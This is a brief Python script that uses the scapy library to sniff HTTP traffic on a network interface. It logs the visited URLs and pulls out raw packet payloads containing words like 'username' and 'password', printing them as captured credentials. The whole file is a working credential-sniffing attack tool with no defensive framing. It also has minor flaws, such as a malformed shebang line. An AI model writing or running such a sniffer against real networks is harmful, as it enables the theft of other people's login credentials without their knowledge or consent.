#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface = interface, store = False , prn = filter_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if (packet.haslayer(scapy.Raw)):
        keywords = ["username", "user", "password", "pass", "login", "loggedin"]
        for key in keywords:
            if key in packet[scapy.Raw].load:
                return packet[scapy.Raw].load

def filter_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[.] HTTP response >> " + get_url(packet))
        login = get_login_info(packet)
        if login:
            print("\n\nUsername and password:")
            print(login+"\n\n")   


sniffer("eth0")